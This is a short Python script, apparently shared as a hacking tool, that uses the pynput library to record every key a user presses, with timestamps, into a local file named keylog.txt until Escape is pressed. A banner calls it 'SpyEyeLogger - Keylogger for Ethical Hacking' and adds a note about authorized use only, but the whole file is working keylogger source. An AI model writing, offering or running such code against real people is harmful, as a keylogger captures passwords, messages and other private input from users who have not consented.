import pynput
from pynput.keyboard import Key, Listener
import logging
import datetime

# Banner
print("""
   _____ _          _______          _ _       
  / ____| |__   __ |__   __|        | | |      
 | |    | '_ \ / _` | | | ___   ___ | | | ___  
 | |    | | | | (_| | | |/ _ \ / __|| | |/ _ \ 
 | |____| | | |\__,_| | | (_) | (__ | | | (_) |
  \_____|_| |_|____| |_| \___/ \___||_|_|\___/
  
  SpyEyeLogger - Keylogger for Ethical Hacking
  Coded by Pakistani White Hat Hacker: Mr. Sabaz Ali Khan
  Note: Use this tool ethically and with proper authorization only!
""")

# Configure logging
log_dir = ""
logging.basicConfig(
    filename=(log_dir + "keylog.txt"),
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

def on_press(key):
    try:
        # Log printable characters
        logging.info(str(key))
    except Exception as e:
        # Log special keys or handle errors
        logging.info(f"Special key {key} pressed")

def on_release(key):
    # Stop logger if escape key is pressed
    if key == Key.esc:
        return False

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()